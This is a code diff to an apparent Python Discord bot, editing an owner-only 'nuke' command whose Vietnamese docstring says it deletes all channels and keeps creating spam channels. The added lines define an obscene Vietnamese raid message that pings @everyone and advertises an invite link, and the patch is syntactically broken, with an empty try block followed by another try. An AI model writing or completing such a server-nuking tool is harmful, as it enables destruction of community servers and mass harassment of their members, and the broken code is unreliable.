@@ -459,7 +459,13 @@ async def setpersona(ctx, *, user_request: str = None):
 @bot.command(name="nuke")
 @is_bot_owner()
 async def nuke_server(ctx):
-    """Xóa tất cả kênh, tạo 100 kênh spam với tên tục tĩu, spam @everyone"""
+    """Xóa tất cả kênh, tạo các kênh spam liên tục."""
+    spam_content = """# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI @everyone
+https://discord.gg/2FKg4SugY
+https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"""
+    
+    try:
+        # Các lệnh tiếp theo...
     try:
         confirm_embed = discord.Embed(
             title="⚠️ XÁC NHẬN LỆNH NUKE SERVER ⚠️",
